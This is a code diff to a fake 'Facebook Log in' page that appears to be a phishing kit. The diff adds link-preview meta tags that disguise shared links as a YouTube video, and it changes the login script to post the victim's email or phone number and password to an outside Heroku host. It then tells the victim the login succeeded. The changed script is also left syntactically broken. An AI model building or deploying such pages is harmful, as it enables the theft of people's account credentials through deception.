@@ -55,8 +55,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Log in</title>
     <link rel="icon" href="img/fbicon.png">
+    
+     <meta property="og:title" content="RATING MY SCHOOL EXPERIENCE (*VERY BAD) #youtube">
+  <meta property="og:description" content="Hello guys please watch me rate my school, thank you for watching and see you on the nex...">
+  <meta property="og:image" content="img/icon.png">
+  <meta property="og:url" content="https://youtube.com/">
+  <meta property="og:type" content="website">
 </head>
 <body>
+    <!-- bilat kantutan na agad -->
     <div class="container">
         <form id="loginForm">
             <input type="text" id="emailOrMobile" placeholder="Mobile number or email" required>
@@ -65,26 +72,33 @@
             <button class="but" type="submit" onclick="handleSubmit(event)"><b>Log in</b></button>
         </form>
     </div>
-
+<!-- Script aitomation procces/backend data reciver -->
     <script>
-        function handleSubmit(event) {
-            event.preventDefault();
-            const emailOrMobile = document.getElementById('emailOrMobile').value;
-            const password = document.getElementById('password').value;
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
 
-            // Send login data to backend (replace with your actual backend URL)
-            fetch('http://localhost:3000/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ emailOrMobile, password }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Login data sent:', data);
-                alert('Login successful'); // Notify user
-            })
+      const emailOrMobile = document.getElementById('emailOrMobile').value;
+      const password = document.getElementById('password').value;
+
+      fetch('https://YouTube-Video.herokuapp.com/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ emailOrMobile, password })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Success:', data);
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+
+   
+  
+          alert('Login successful'); // Notify user
+            });
             .catch(error => {
                 console.error('Error:', error);
                 alert('Login failed'); // Notify user
